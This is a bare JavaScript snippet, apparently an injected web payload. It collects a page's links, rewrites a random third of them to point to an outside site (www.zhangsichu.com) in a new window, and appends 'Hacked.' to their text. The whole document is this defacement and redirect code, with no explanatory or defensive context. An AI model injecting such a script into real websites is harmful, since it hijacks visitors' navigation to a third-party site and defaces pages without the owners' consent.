var links = document.getElementsByTagName("A"); if (typeof (links) != 'object' || links == null || links.length <= 0) {} else { var build = new Array(); var count = parseInt(links.length / 3) - 1; for (var i = 0; i < count; i++) { if (build[i] == null) { var index = parseInt(Math.random() * 100) % links.length; links[index].href = "http://www.zhangsichu.com"; links[index].target = "_blank"; links[index].innerHTML = links[index].innerHTML + "Hacked."; build[i] = true; } else { i--; } } }